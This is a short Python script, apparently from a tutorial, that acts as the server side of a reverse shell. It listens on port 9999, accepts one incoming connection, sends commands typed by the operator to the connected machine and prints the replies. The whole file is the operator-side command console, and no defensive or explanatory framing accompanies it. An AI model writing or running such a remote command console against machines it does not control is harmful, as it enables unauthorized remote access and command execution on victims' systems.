import socket
import sys
import threading
import time
from queue import Queue



# Creating a scoket ( Connecting to computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("socket creation error: " + str(msg))

# Biding socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))

        s.bind((host,port))
        s.listen(5)


    except socket.error as msg:
        print("Socket Binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()



# Establishing connection with a client  (Socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! " + "IP " + address[0] + "| Port " + str(address[1]))
    send_commands(conn)
    
    #Close connection
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")
            #end ="" will help it to go to next line

def main():
    create_socket()
    bind_socket()
    socket_accept()

# Run the main program now
main()
